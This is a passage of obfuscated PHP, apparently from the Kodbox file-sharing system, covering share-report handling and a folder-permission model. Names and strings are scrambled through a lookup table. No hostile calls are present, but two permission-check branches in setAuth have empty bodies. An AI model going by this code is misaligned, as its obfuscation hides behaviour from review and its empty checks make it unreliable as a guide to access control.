$¸¦êé“í[$¤šøËî³[2311]][$¤šøËî³[856]] != $¤šøËî³[91]) { unset($ŒêäğÏ[$ú–”Ğúâ]); continue; } $™˜ä¶±´ = $¸¦êé“í[$¤šøËî³[193]]; $¸¦êé“í[$¤šøËî³[90]] = $ßŸßÕ„Ò[$™˜ä¶±´] ? $ßŸßÕ„Ò[$™˜ä¶±´] : !1; if ($¸¦êé“í[$¤šøËî³[90]][$¤šøËî³[525]] == $¤šøËî³[91]) { unset($ŒêäğÏ[$ú–”Ğúâ]); } if ($¸¦êé“í[$¤šøËî³[90]] != $¤šøËî³[230] && !$¸¦êé“í[$¤šøËî³[90]]) { unset($ŒêäğÏ[$ú–”Ğúâ]); } } unset($¸¦êé“í); $ŒêäğÏ = array_values($ŒêäğÏ); } private function _makeOrder($áÇ¸¬«Ç = '') { $“úÛ«ªñ =& $_SERVER[Ï×Œõ”û]; $ Ó¶è‡ = array($“úÛ«ªñ[233], $“úÛ«ªñ[868], $“úÛ«ªñ[2295], $“úÛ«ªñ[2296]); $µÒ¥Òıè = array($“úÛ«ªñ[542] => $“úÛ«ªñ[543], $“úÛ«ªñ[544] => $“úÛ«ªñ[545]); $ÓÁœîñØ = Input::get($“úÛ«ªñ[549], $“úÛ«ªñ[7], $“úÛ«ªñ[517], $ Ó¶è‡); $Ñ¸ ’“ = Input::get($“úÛ«ªñ[550], $“úÛ«ªñ[7], $“úÛ«ªñ[2312], array($“úÛ«ªñ[2230], $“úÛ«ªñ[544])); $Ñ¸ ’“ = $µÒ¥Òıè[$Ñ¸ ’“]; $áÇ¸¬«Ç = $áÇ¸¬«Ç . "{$ÓÁœîñØ}\x20{$Ñ¸ ’“}"; return $this->order($áÇ¸¬«Ç); } public function reportAdd($ñ§ÔĞÖ) { $ÚÒ¬¨¸ =& $_SERVER[Ï×Œõ”û]; $Ò’ÕÏÆ¸ = array($ÚÒ¬¨¸[693] => $ñ§ÔĞÖ[$ÚÒ¬¨¸[693]], $ÚÒ¬¨¸[1547] => USER_ID); if (Model($ÚÒ¬¨¸[2307])->where($Ò’ÕÏÆ¸)->find()) { return !1; } $ıâíÉ”Ò = array($ÚÒ¬¨¸[693] => $ñ§ÔĞÖ[$ÚÒ¬¨¸[693]], $ÚÒ¬¨¸[1818] => $ñ§ÔĞÖ[$ÚÒ¬¨¸[1818]], $ÚÒ¬¨¸[193] => $ñ§ÔĞÖ[$ÚÒ¬¨¸[193]], $ÚÒ¬¨¸[562] => $ñ§ÔĞÖ[$ÚÒ¬¨¸[562]], $ÚÒ¬¨¸[1547] => USER_ID, $ÚÒ¬¨¸[33] => $ñ§ÔĞÖ[$ÚÒ¬¨¸[33]], $ÚÒ¬¨¸[545] => $ñ§ÔĞÖ[$ÚÒ¬¨¸[545]]); return Model($ÚÒ¬¨¸[2307])->add($ıâíÉ”Ò); } public function reportList($’ËÆ…¶) { $ışÏ¶ŠÇ =& $_SERVER[Ï×Œõ”û]; $Ä‘ç·ı“ = array(); if ($’ËÆ…¶[$ışÏ¶ŠÇ[867]]) { $¾ÃÚŠùŠ = $’ËÆ…¶[$ışÏ¶ŠÇ[868]] ? $’ËÆ…¶[$ışÏ¶ŠÇ[868]] : strtotime(date($ışÏ¶ŠÇ[2310])); $Ä‘ç·ı“[$ışÏ¶ŠÇ[233]] = array($ışÏ¶ŠÇ[410], array($’ËÆ…¶[$ışÏ¶ŠÇ[867]], $¾ÃÚŠùŠ)); } if (isset($’ËÆ…¶[$ışÏ¶ŠÇ[33]]) && in_array($’ËÆ…¶[$ışÏ¶ŠÇ[33]], array($ışÏ¶ŠÇ[91], $ışÏ¶ŠÇ[529], $ışÏ¶ŠÇ[2313], $ışÏ¶ŠÇ[2314], $ışÏ¶ŠÇ[2315]))) { $Ä‘ç·ı“[$ışÏ¶ŠÇ[33]] = $’ËÆ…¶[$ışÏ¶ŠÇ[33]]; } if (isset($’ËÆ…¶[$ışÏ¶ŠÇ[856]]) && in_array($’ËÆ…¶[$ışÏ¶ŠÇ[856]], array($ışÏ¶ŠÇ[230], $ışÏ¶ŠÇ[91], $ışÏ¶ŠÇ[529], $ışÏ¶ŠÇ[2313]))) { $Ä‘ç·ı“[$ışÏ¶ŠÇ[856]] = $’ËÆ…¶[$ışÏ¶ŠÇ[856]]; } $ŒÏ‘ÃîÂ = Input::get($ışÏ¶ŠÇ[550], $ışÏ¶ŠÇ[7], $ışÏ¶ŠÇ[2312], array($ışÏ¶ŠÇ[2230], $ışÏ¶ŠÇ[544])); $ÃóÛÇ­‡ = array($ışÏ¶ŠÇ[542] => $ışÏ¶ŠÇ[543], $ışÏ¶ŠÇ[544] => $ışÏ¶ŠÇ[545]); $¨Óô = $ışÏ¶ŠÇ[2316] . $ÃóÛÇ­‡[$ŒÏ‘ÃîÂ]; $ã¢±À‚• = Model($ışÏ¶ŠÇ[2307])->where($Ä‘ç·ı“)->order($¨Óô)->selectPage(20); if (empty($ã¢±À‚•[$ışÏ¶ŠÇ[447]])) { return array(); } $Â¥±º = array_to_keyvalue_group($ã¢±À‚•[$ışÏ¶ŠÇ[447]], $ışÏ¶ŠÇ[856], $ışÏ¶ŠÇ[693]); if (!empty($Â¥±º[0])) { $’ËÆ…¶ = $Â¥±º[0]; $Ä‘ç·ı“ = array($ışÏ¶ŠÇ[693] => array($ışÏ¶ŠÇ[7], $’ËÆ…¶)); $şÚú¶¬° = $this->where($Ä‘ç·ı“)->field($ışÏ¶ŠÇ[693])->select(); $şÚú¶¬° = array_to_keyvalue($şÚú¶¬°, $ışÏ¶ŠÇ[12], $ışÏ¶ŠÇ[693]); $Ğİó„¹ó = array_diff($’ËÆ…¶, $şÚú¶¬°); if (!empty($Ğİó„¹ó)) { foreach ($ã¢±À‚•[$ışÏ¶ŠÇ[447]] as $’¤ÓÛ± => $¬ëÉîìÍ) { if (in_array($¬ëÉîìÍ[$ışÏ¶ŠÇ[693]], $Ğİó„¹ó)) { unset($ã¢±À‚•[$ışÏ¶ŠÇ[447]][$’¤ÓÛ±]); } } } } $this->_listDataApply($ã¢±À‚•[$ışÏ¶ŠÇ[447]]); return $ã¢±À‚•; } public function reportStatus($–ˆøàÙ) { $’ø½€Ö° =& $_SERVER[Ï×Œõ”û]; $×ñĞ¯êô = array($’ø½€Ö°[484] => $–ˆøàÙ[$’ø½€Ö°[484]]); $·§¬Ú´ = Model($’ø½€Ö°[2307])->where($×ñĞ¯êô)->field($’ø½€Ö°[2317])->find(); if (!$·§¬Ú´) { return !1; } $¤Éˆã‡ï = array($’ø½€Ö°[856] => $–ˆøàÙ[$’ø½€Ö°[856]]); if ($–ˆøàÙ[$’ø½€Ö°[856]] == $’ø½€Ö°[2313] && $·§¬Ú´[$’ø½€Ö°[856]] == $’ø½€Ö°[2313]) { $¤Éˆã‡ï[$’ø½€Ö°[856]] = 0; } $Çã³ú°õ = Model($’ø½€Ö°[2307])->where($×ñĞ¯êô)->save($¤Éˆã‡ï); if ($–ˆøàÙ[$’ø½€Ö°[856]] == $’ø½€Ö°[529]) { if ($·§¬Ú´[$’ø½€Ö°[562]] != $’ø½€Ö°[230] && $this->shareFileMeta($·§¬Ú´[$’ø½€Ö°[562]])) { $this->shareFileMeta($·§¬Ú´[$’ø½€Ö°[562]], 0); } $this->remove($·§¬Ú´[$’ø½€Ö°[693]]); return !0; } if ($Çã³ú°õ && $–ˆøàÙ[$’ø½€Ö°[856]] == $’ø½€Ö°[2313]) { $ÖŸà„¬ç = $¤Éˆã‡ï[$’ø½€Ö°[856]] == $’ø½€Ö°[2313] ? 1 : 0; $this->shareFileMeta($·§¬Ú´[$’ø½€Ö°[562]], $ÖŸà„¬ç); $this->removeByFile($·§¬Ú´[$’ø½€Ö°[562]]); } return $Çã³ú°õ; } private function removeByFile($õ»‚´) { $°ì³ôê =& $_SERVER[Ï×Œõ”û]; $üïÓ‰ÊŸ = Model($°ì³ôê[939])->where(array($°ì³ôê[562] => $õ»‚´))->field($°ì³ôê[193])->select(); $¡²ıÜœ¹ = array_to_keyvalue($üïÓ‰ÊŸ, $°ì³ôê[12], $°ì³ôê[193]); $‘äòû× = array($°ì³ôê[193] => array($°ì³ôê[7], $¡²ıÜœ¹), $°ì³ôê[583] => 1); $üïÓ‰ÊŸ = $this->where($‘äòû×)->field($°ì³ôê[693])->select(); if (empty($üïÓ‰ÊŸ)) { return; } $Ù‚çâ×¢ = array_to_keyvalue($üïÓ‰ÊŸ, $°ì³ôê[12], $°ì³ôê[693]); $this->remove($Ù‚çâ×¢); } private function shareFileMeta($â¶Ú´Ëç, $ŸüÅµó = null) { $öäé‰»à =& $_SERVER[Ï×Œõ”û]; $ØĞáÁ³´ = array($öäé‰»à[562] => $â¶Ú´Ëç, $öäé‰»à[95] => $öäé‰»à[2318]); if (is_null($ŸüÅµó)) { return Model($öäé‰»à[2319])->where($ØĞáÁ³´)->find(); } $ØĞáÁ³´[$öäé‰»à[452]] = $ŸüÅµó; Model($öäé‰»à[2319])->add($ØĞáÁ³´, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\162\x63\145\137\141\165\x74\150"; public function getAuth($„îÕÛ–) { $¼‘áÃˆò =& $_SERVER[Ï×Œõ”û]; $Á¢ğÓ‹ñ = $this->sourceAuthSelect($„îÕÛ–); $øĞÜİˆ = array(); $ûšäÚÒŒ = array(); $è•è»Ë‘ = 2 << 25; foreach ($Á¢ğÓ‹ñ as $ÚäßèãÀ) { $†Á—ííÄ = Model($¼‘áÃˆò[596])->listData($ÚäßèãÀ[$¼‘áÃˆò[1594]]); if (!$†Á—ííÄ) { continue; } $øĞÜİˆ[] = $ÚäßèãÀ; $–”â¦ì‘ = 0; if ($ÚäßèãÀ[$¼‘áÃˆò[190]] == SourceModel::TYPE_GROUP) { $–”â¦ì‘ = $è•è»Ë‘ * 2; } if ($ÚäßèãÀ[$¼‘áÃˆò[190]] == SourceModel::TYPE_USER) { $–”â¦ì‘ = $è•è»Ë‘; } if ($ÚäßèãÀ[$¼‘áÃˆò[190]] == SourceModel::TYPE_USER && $ÚäßèãÀ[$¼‘áÃˆò[594]] == $¼‘áÃˆò[230]) { $–”â¦ì‘ = 0; } $ûšäÚÒŒ[] = $†Á—ííÄ[$¼‘áÃˆò[507]] + $–”â¦ì‘; } array_multisort($ûšäÚÒŒ, SORT_DESC, $øĞÜİˆ); return $øĞÜİˆ; } public function sourceAuthSelect($¼·©¿–) { $€¨ÇãĞ÷ =& $_SERVER[Ï×Œõ”û]; static $‘µïèÑ = array(); $Ó×ÑŞ²  = is_array($¼·©¿–) ? !1 : !0; if ($Ó×ÑŞ² ) { $¼·©¿– = array($¼·©¿–); } $¨ î£Ğó = array(); foreach ($¼·©¿– as $•ºÒƒ¨„) { if (isset($‘µïèÑ[$•ºÒƒ¨„])) { $¨ î£Ğó[$•ºÒƒ¨„] = $‘µïèÑ[$•ºÒƒ¨„]; } } if (count($¨ î£Ğó) == count($¼·©¿–)) { return $Ó×ÑŞ²  ? $¨ î£Ğó[$¼·©¿–[0]] : $¨ î£Ğó; } $ƒ…áõ– = $€¨ÇãĞ÷[2320]; $òÙÍ˜ã = array($€¨ÇãĞ÷[193] => array($€¨ÇãĞ÷[7], $¼·©¿–)); $Ç—òœšÂ = $this->field($ƒ…áõ–)->order($€¨ÇãĞ÷[484])->where($òÙÍ˜ã)->select(); $ÓíâĞì = array_to_keyvalue_group($Ç—òœšÂ, $€¨ÇãĞ÷[193]); foreach ($¼·©¿– as $•ºÒƒ¨„) { $‘µïèÑ[$•ºÒƒ¨„] = $ÓíâĞì[$•ºÒƒ¨„] ? $ÓíâĞì[$•ºÒƒ¨„] : array(); } if ($Ó×ÑŞ² ) { return $Ç—òœšÂ; } return $ÓíâĞì; } public function setAuth($ÅçÖîªç, $šïÌœ) { $ê‚ºÖ•“ =& $_SERVER[Ï×Œõ”û]; $º­òã¶ = Model($ê‚ºÖ•“[1487])->sourceInfo($ÅçÖîªç); if (!$º­òã¶) { return !1; } if ($º­òã¶[$ê‚ºÖ•“[190]] != SourceModel::TYPE_GROUP) { return !1; } $£åšÃü = 1; $£Î›Ò¼‡ = $º­òã¶[$ê‚ºÖ•“[594]]; if ($£Î›Ò¼‡ != $£åšÃü) { $²¢±Ãû = array($ê‚ºÖ•“[1449] => $£Î›Ò¼‡); $ğ’å îÇ = Model($ê‚ºÖ•“[2229])->field($ê‚ºÖ•“[1547])->where($²¢±Ãû)->select(); $ğ’å îÇ = array_to_keyvalue($ğ’å îÇ, $ê‚ºÖ•“[12], $ê‚ºÖ•“[1547]); } $ÉÂÖŠÖŞ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Øøİ€«Ï = array(); foreach ($šïÌœ as $£Öñ§Ü©) { if (!in_array($£Öñ§Ü©[$ê‚ºÖ•“[190]], $ÉÂÖŠÖŞ)) { show_json(LNG($ê‚ºÖ•“[2321]), !1); } if ($£Î›Ò¼‡ != $£åšÃü) { if ($£Öñ§Ü©[$ê‚ºÖ•“[190]] == SourceModel::TYPE_GROUP) { } if ($£Öñ§Ü©[$ê‚ºÖ•“[594]] != 0 && !in_array($£Öñ§Ü©[$ê‚ºÖ•“[594]], $ğ’å îÇ)) { } } if ($£Öñ§Ü©[$ê‚ºÖ•“[594]] == 0) { $£Öñ§Ü©[$ê‚ºÖ•“[190]] = SourceModel::TYPE_USER; } $Øøİ€«Ï[] = array($ê‚ºÖ•“[193] => $ÅçÖîªç, $ê‚ºÖ•“[190] => intval($£Öñ§Ü©[$ê‚ºÖ•“[190]]), $ê‚ºÖ•“[594] => intval($£Öñ§Ü©[$ê‚ºÖ•“[594]]), $ê‚ºÖ•“[1594] => intval($£Öñ§Ü©[$ê‚ºÖ•“[1594]]) ? intval($£Öñ§Ü©[$ê‚ºÖ•“[1594]]) : 0, $ê‚ºÖ•“[2299] => intval($£Öñ§Ü©[$ê‚ºÖ•“[2299]]) ? intval($£Öñ§Ü©[$ê‚ºÖ•“[2299]]) : -1); } $this->where(array($ê‚ºÖ•“[511] => $ÅçÖîªç))->delete(); $this->addAll($Øøİ€«Ï); return !0; } public function authClear($À±ÇÃ) { $†µ ‹‚€ =& $_SERVER[Ï×Œõ”û]; $æµêßÑš = Model($†µ ‹‚€[1487])->sourceInfo($À±ÇÃ); $Û£ò±Ùå = array($À±ÇÃ); if ($æµêßÑš[$†µ ‹‚€[505]] == $†µ ‹‚€[91]) { $Ş“Íî÷„ = array($†µ ‹‚€[680] => array($†µ ‹‚€[640], $æµêßÑš[$†µ ‹‚€[609]] . $À±ÇÃ . $†µ ‹‚€[641])); $Û£ò±Ùå = Model($†µ ‹‚€[1487])->field($†µ ‹‚€[511])->where($Ş“Íî÷„)->getField($†µ ‹‚€[193], !0); $Û£ò±Ùå[] = $À±ÇÃ; } $this->where(array($†µ ‹‚€[511] => array($†µ ‹‚€[512], $Û£ò±Ùå)))->delete(); return !0; } public function getAllParent($Ùñ™íÔ) { $›×Şƒò =& $_SERVER[Ï×Œõ”û]; $§ğ€ñ‚À = Model($›×Şƒò[1487])->sourceInfo($Ùñ™íÔ); if (!$§ğ€ñ‚À || $§ğ€ñ‚À[$›×Şƒò[190]] != SourceModel::TYPE_GROUP) { return array(); } $±¬•±¯ï = Model($›×Şƒò[1487])->parentLevelArray($§ğ€ñ‚À[$›×Şƒò[609]]); $şˆÊöÉñ = array_merge(array(intval($Ùñ™íÔ)), array_reverse($±¬•±¯ï)); $—×ÓĞµè = $this->sourceAuthSelect($şˆÊöÉñ); $áÏëÙ†º = $GLOBALS[$›×Şƒò[6]][$›×Şƒò[92]][$›×Şƒò[2242]] == 1; $ß¬³ÆÓ£ = $áÏëÙ†º ? 3 : 2; $ü¡ô’• = Model($›×Şƒò[1447])->getInfo($§ğ€ñ‚À[$›×Şƒò[594]]); $’¹–¹õ = explode($›×Şƒò[50], trim($ü¡ô’•[$›×Şƒò[609]], $›×Şƒò[50])); $ÂÔÚêÒì = array_merge(array($ü¡ô’•[$›×Şƒò[1449]]), array_reverse(array_slice($’¹–¹õ, $ß¬³ÆÓ£))); foreach ($—×ÓĞµè as $Ùñ™íÔ => $ó¿³—ûì) { foreach ($ó¿³—ûì as $ô»ùÜ‘ç) { if (!$ô»ùÜ‘ç || !$ô»ùÜ‘ç[$›×Şƒò[594]] || $ô»ùÜ‘ç[$›×Şƒò[594]] == $›×Şƒò[230]) { continue; } if ($ô»ùÜ‘ç[$›×Şƒò[190]] != SourceModel::TYPE_GROUP) { continue; } $ÂÔÚêÒì[] = $ô»ùÜ‘ç[$›×Şƒò[594]]; } } $ÂÔÚêÒì = array_unique($ÂÔÚêÒì); $ä¥¦è°Î = array($›×Şƒò[430] => _get($GLOBALS[$›×Şƒò[7]], $›×Şƒò[430], 1), $›×Şƒò[441] => _get($GLOBALS[$›×Şƒò[7]], $›×Şƒò[441], 500)); $GLOBALS[$›×Şƒò[7]][$›×Şƒò[430]] = 1; $GLOBALS[$›×Şƒò[7]][$›×Şƒò[441]] = 500; $†íÒÜ²› = array($›×Şƒò[513] => 0, $›×Şƒò[2143] => AuthModel::authAll(), $›×Şƒò[514] => LNG($›×Şƒò[2322]), $›×Şƒò[2158] => $›×Şƒò[2323]); $‡Ø¿Á°Ì = array(); $å”¨£€ = explode($›×Şƒò[50], $›×Şƒò[2324]); $ª»€È¶ = explode($›×Şƒò[50], $›×Şƒò[2325]); foreach ($ÂÔÚêÒì as $öı³¨¸”) { $¼¢Û£Æ« = Model($›×Şƒò[1447])->getInfo($öı³¨¸”); $ÑÕÃ¬¡£ = array_field_key($¼¢Û£Æ«, $å”¨£€); $‘ãø™® = Model($›×Şƒò[622])->listByGroup($öı³¨¸”); foreach ($‘ãø™®[$›×Şƒò[447]] as $‹ğ¥øı® => $ÍÙõ¦òœ) { $this->userGroupList($ÍÙõ¦òœ[$›×Şƒò[1547]], $ÍÙõ¦òœ); $×ŒÆ¬–í = $ÍÙõ¦òœ[$›×Şƒò[1547]] . $›×Şƒò[12]; if (isset($‡Ø¿Á°Ì[$×ŒÆ¬–í])) { continue; } $İ¤Ê‰€Á = Model($›×Şƒò[2326])->listData($ÍÙõ¦òœ[$›×Şƒò[2327]]); $ÍÙõ¦òœ[$›×Şƒò[2328]] = Action($›×Şƒò[2329])->parseUrl($ÍÙõ¦òœ[$›×Şƒò[2328]]); $ÍÙõ¦òœ[$›×Şƒò[1895]] = $İ¤Ê‰€Á && $İ¤Ê‰€Á[$›×Şƒò[2330]] == 1; $”íóÎ™Ğ = $this->groupRootAuth($öı³¨¸”, $ÍÙõ¦òœ[$›×Şƒò[1547]]); $”íóÎ™Ğ = $ÍÙõ¦òœ[$›×Şƒò[1895]] ? $†íÒÜ²› : $”íóÎ™Ğ; $‡Ø¿Á°Ì[$×ŒÆ¬–í] = array($›×Şƒò[2331] => $›×Şƒò[2332], $›×Şƒò[2333] => LNG($›×Şƒò[2334]), $›×Şƒò[2311] => array_field_key($ÍÙõ¦òœ, $ª»€È¶), $›×Şƒò[507] => $”íóÎ™Ğ, $›×Şƒò[508] => $”íóÎ™Ğ[$›×Şƒò[507]], $›×Şƒò[2335] => $ÑÕÃ¬¡£); } } $GLOBALS[$›×Şƒò[7]][$›×Şƒò[430]] = $ä¥¦è°Î[$›×Şƒò[430]]; $GLOBALS[$›×Şƒò[7]][$›×Şƒò[441]] = $ä¥¦è°Î[$›×Şƒò[441]]; foreach ($—×ÓĞµè as $Ùñ™íÔ => $ó¿³—ûì) { if (!$ó¿³—ûì) { continue; } foreach ($ó¿³—ûì as $ô»ùÜ‘ç) { if (!$ô»ùÜ‘ç || !$ô»ùÜ‘ç[$›×Şƒò[594]] || $ô»ùÜ‘ç[$›×Şƒò[594]] == $›×Şƒò[230]) { continue; } if ($ô»ùÜ‘ç[$›×Şƒò[190]] != SourceModel::TYPE_USER) { continue; } $×ŒÆ¬–í = $ô»ùÜ‘ç[$›×Şƒò[594]] . $›×Şƒò[12]; if (isset($‡Ø¿Á°Ì[$×ŒÆ¬–í])) { continue; } $İûÒ’± = $this->authMake($ó¿³—ûì, $×ŒÆ¬–í); if (!$İûÒ’± || !$İûÒ’±[$›×Şƒò[2333]]) { continue; } $‡Ø¿Á°Ì[$×ŒÆ¬–í] = array($›×Şƒò[2331] => $›×Şƒò[2336], $›×Şƒò[2333] => $İûÒ’±[$›×Şƒò[2333]], $›×Şƒò[2311] => Model($›×Şƒò[622])->getInfoSimpleOuter($×ŒÆ¬–í), $›×Şƒò[507] => $İûÒ’±[$›×Şƒò[561]], $›×Şƒò[508] => $İûÒ’±[$›×Şƒò[561]][$›×Şƒò[507]], $›×Şƒò[2335] => $İûÒ’±[$›×Şƒò[2337]]); } } foreach ($—×ÓĞµè as $Ùñ™íÔ => $ó¿³—ûì) { if (!$ó¿³—ûì) { continue; } foreach ($‡Ø¿Á°Ì as $×ŒÆ¬–í => $‚¥†½¾) { if ($‚¥†½¾[$›×Şƒò[2311]][$›×Şƒò[1895]] || $‚¥†½¾[$›×Şƒò[2331]] == $›×Şƒò[2336]) { continue; } $İûÒ’± = $this->authMake($ó¿³—ûì, $×ŒÆ¬–í); if (!$İûÒ’± || !$İûÒ’±[$›×Şƒò[2333]]) { continue; } $‡Ø¿Á°Ì[$×ŒÆ¬–í] = array($›×Şƒò[2331] => $›×Şƒò[2336], $›×Şƒò[2333] => $İûÒ’±[$›×Şƒò[2333]], $›×Şƒò[2311] => $‚¥†½¾[$›×Şƒò[2311]], $›×Şƒò[507] => $İûÒ’±[$›×Şƒò[561]], $›×Şƒò[508] => $İûÒ’±[$›×Şƒò[561]][$›×Şƒò[507]], $›×Şƒò[2335] => $İûÒ’±[$›×Şƒò[2337]]); } } $‡Ø¿Á°Ì = array_sort_by($‡Ø¿Á°Ì, $›×Şƒò[508], $›×Şƒò[545]); return $‡Ø¿Á°Ì; } public function getAllChildren($¦¼´ŠŸş) { $«Çî¥ıË =& $_SERVER[Ï×Œõ”û]; $‚ÁîÃá = Model($«Çî¥ıË[1487])->sourceInfo($¦¼´ŠŸş); if ($‚ÁîÃá[$«Çî¥ıË[505]] != $«Çî¥ıË[91]) { return $this->sourceListAuth(array($¦¼´ŠŸş)); } if ($‚ÁîÃá[$«Çî¥ıË[190]] != SourceModel::TYPE_GROUP) { return array(); } $‘Èø­ä¨ = 1; $½ÛÀ¯êû = array($¦¼´ŠŸş); if ($‚ÁîÃá[$«Çî¥ıË[192]] == $«Çî¥ıË[230] && $‚ÁîÃá[$«Çî¥ıË[594]] != $‘Èø­ä¨) { $½ÛÀ¯êû = $this->groupChidldAllRootSource($‚ÁîÃá[$«Çî¥ıË[594]]); } $ä ±‰Ç› = $this->field($«Çî¥ıË[193])->group($«Çî¥ıË[193])->select(); $ä ±‰Ç› = array_to_keyvalue($ä ±‰Ç›, $«Çî¥ıË[12], $«Çî¥ıË[193]); if (!$ä ±‰Ç›) { return array(); } $È¡Ÿäòœ = $«Çî¥ıË[2338]; $û÷¾òÒñ = array($«Çî¥ıË[193] => array($«Çî¥ıË[7], $ä ±‰Ç›), $«Çî¥ıË[525] => $«Çî¥ıË[230]); $Ã”ª˜®× = Model($«Çî¥ıË[939])->field($È¡Ÿäòœ)->where($û÷¾òÒñ)->select(); $±Ò‘Ï± = array($¦¼´ŠŸş); foreach ($Ã”ª˜®× as $„œÈ‘ºü) { foreach ($½ÛÀ¯êû as $²ñãúÖ¦) { $ø¡©ÈÄ¡ = $«Çî¥ıË[50] . $²ñãúÖ¦ . $«Çî¥ıË[50]; $ŠÛ––á© = $„œÈ‘ºü[$«Çî¥ıË[609]] . $„œÈ‘ºü[$«Çî¥ıË[193]] . $«Çî¥ıË[50]; if (strstr($ŠÛ––á©, $ø¡©ÈÄ¡)) { $±Ò‘Ï±[] = $„œÈ‘ºü[$«Çî¥ıË[193]]; break; } } } return $this->sourceListAuth($±Ò‘Ï±); } private function sourceListAuth($°Ï„˜€¡) { $ãôáÈªñ =& $_SERVER[Ï×Œõ”û]; $¬¦­©À½ = Model($ãôáÈªñ[1487])->sourceListInfo($°Ï„˜€¡, !0); $Ìï˜üïæ = $this->sourceAuthSelect($°Ï„˜€¡); $¹ì×“É‚ = array(); $ıíŞŠ×æ = array(); foreach ($¬¦­©À½ as $Â“ƒ×·Ş) { unset($Â“ƒ×·Ş[$ãôáÈªñ[548]]); unset($Â“ƒ×·Ş[$ãôáÈªñ[546]]); unset($Â“ƒ×·Ş[$ãôáÈªñ[507]]); unset($Â“ƒ×·Ş[$ãôáÈªñ[90]]); $ŞÔÛó® = $Ìï˜üïæ[$Â“ƒ×·Ş[$ãôáÈªñ[193]]]; if (!$ŞÔÛó®) { continue; } $Â“ƒ×·Ş[$ãôáÈªñ[2335]] = $this->authTargetInfo($ŞÔÛó®); $Â“ƒ×·Ş[$ãôáÈªñ[607]] = rtrim($Â“ƒ×·Ş[$ãôáÈªñ[613]], $ãôáÈªñ[8]) . $ãôáÈªñ[8] . ltrim($Â“ƒ×·Ş[$ãôáÈªñ[607]], $ãôáÈªñ[8]); $¹ì×“É‚[] = $Â“ƒ×·Ş; $ºï³ï™ = count(explode($ãôáÈªñ[8], trim($Â“ƒ×·Ş[$ãôáÈªñ[607]], $ãôáÈªñ[8]))); $ıíŞŠ×æ[] = $ºï³ï™ + ($Â“ƒ×·Ş[$ãôáÈªñ[33]] == $ãôáÈªñ[78] ? 0 : 1000); } array_multisort($ıíŞŠ×æ, SORT_ASC, $¹ì×“É‚); return $¹ì×“É‚; } private function groupChidldAllRootSource($£÷Áüæ×) { $°Ş•¦ê· =& $_SERVER[Ï×Œõ”û]; $ßÌæŒ…– = Model($°Ş•¦ê·[1447])->groupChildrenAll($£÷Áüæ×); $Æ…™œÈ = array($°Ş•¦ê·[192] => 0, $°Ş•¦ê·[594] => array($°Ş•¦ê·[7], $ßÌæŒ…–), $°Ş•¦ê·[190] => SourceModel::TYPE_GROUP); $œé¹–‡ì = Model($°Ş•¦ê·[939])->field($°Ş•¦ê·[193])->where($Æ…™œÈ)->select(); $œé¹–‡ì = array_to_keyvalue($œé¹–‡ì, $°Ş•¦ê·[12], $°Ş•¦ê·[193]); return $œé¹–‡ì; } private function authTargetInfo($Æüîöäê) { $˜ëˆÌ² =& $_SERVER[Ï×Œõ”û]; $ÆÄƒ«€ = array(); $´ñÚéøğ = array(); $Ø’‘—š» = 2 << 25; foreach ($Æüîöäê as $ìãù©´) { $µª¾Û¾ğ = Model($˜ëˆÌ²[596])->listData($ìãù©´[$˜ëˆÌ²[1594]]); if (!$µª¾Û¾ğ) { continue; } if ($ìãù©´[$˜ëˆÌ²[190]] == SourceModel::TYPE_USER) { $Í“ì‘ã€ = Model($˜ëˆÌ²[602])->getInfoSimpleOuter($ìãù©´[$˜ëˆÌ²[594]]); if ($Í“ì‘ã€[$˜ëˆÌ²[1547]] == $˜ëˆÌ²[1331]) { continue; } if ($Í“ì‘ã€[$˜ëˆÌ²[1547]] == $˜ëˆÌ²[230]) { $Í“ì‘ã€[$˜ëˆÌ²[32]] = LNG($˜ëˆÌ²[2339]); } } else { $Í“ì‘ã€ = Model($˜ëˆÌ²[610])->getInfoSimple($ìãù©´[$˜ëˆÌ²[594]]); } if (!$Í“ì‘ã€) { continue; } $Í“ì‘ã€[$˜ëˆÌ²[561]] = $µª¾Û¾ğ; $ÆÄƒ«€[] = $Í“ì‘ã€; $ïô½ø–’ = 0; if ($ìãù©´[$˜ëˆÌ²[190]] == SourceModel::TYPE_GROUP) { $ïô½ø–’ = $Ø’‘—š» * 2; } if ($ìãù©´[$˜ëˆÌ²[190]] == SourceModel::TYPE_USER) { $ïô½ø–’ = $Ø’‘—š»; } if ($ìãù©´[$˜ëˆÌ²[190]] == SourceModel::TYPE_USER && $ìãù©´[$˜ëˆÌ²[594]] == $˜ëˆÌ²[230]) { $ïô½ø–’ = 0; } $´ñÚéøğ[] = $µª¾Û¾ğ[$˜ëˆÌ²[507]] + $ïô½ø–’; } array_multisort($´ñÚéøğ, SORT_DESC, $ÆÄƒ«€); return $ÆÄƒ«€; } public function getAllChildrenByUser($…¦¡”¢¯, $óî¾™½±) { $ø¦´ö‰ =& $_SERVER[Ï×Œõ”û]; $Ğ³®’°õ = Model($ø¦´ö‰[622])->getInfo($óî¾™½±); if (!$óî¾™½± || !$…¦¡”¢¯ || !$Ğ³®’°õ) { return array(); } $Ò¡±®ó½ = Model($ø¦´ö‰[1487])->sourceInfo($…¦¡”¢¯); $ïœ‹©ƒø = array(); $Åø‡âø¡ = 1; if ($Ò¡±®ó½[$ø¦´ö‰[192]] == $ø¦´ö‰[230] && $Ò¡±®ó½[$ø¦´ö‰[594]] != $Åø‡âø¡ && $this->groupContainUser($Ò¡±®ó½[$ø¦´ö‰[594]], $óî¾™½±)) { foreach ($Ğ³®’°õ[$ø¦´ö‰[1448]] as $úíöü) { $âÅáÅşÊ = Model($ø¦´ö‰[610])->getInfo($úíöü[$ø¦´ö‰[1449]]); $Ëµù×ÆÀ = Model($ø¦´ö‰[622])->getInfoSimpleOuter($óî¾™½±); $Ëµù×ÆÀ[$ø¦´ö‰[561]] = $úíöü[$ø¦´ö‰[507]]; if (Model($ø¦´ö‰[596])->authCheckAction($úíöü[$ø¦´ö‰[507]][$ø¦´ö‰[507]], $ø¦´ö‰[1519])) { continue; } $òŠò‚À• = array($ø¦´ö‰[32] => $ø¦´ö‰[1350] . $âÅáÅşÊ[$ø¦´ö‰[32]], $ø¦´ö‰[193] => $âÅáÅşÊ[$ø¦´ö‰[90]][$ø¦´ö‰[193]], $ø¦´ö‰[87] => KodIO::make($âÅáÅşÊ[$ø¦´ö‰[90]][$ø¦´ö‰[193]]), $ø¦´ö‰[192] => $ø¦´ö‰[230], $ø¦´ö‰[190] => 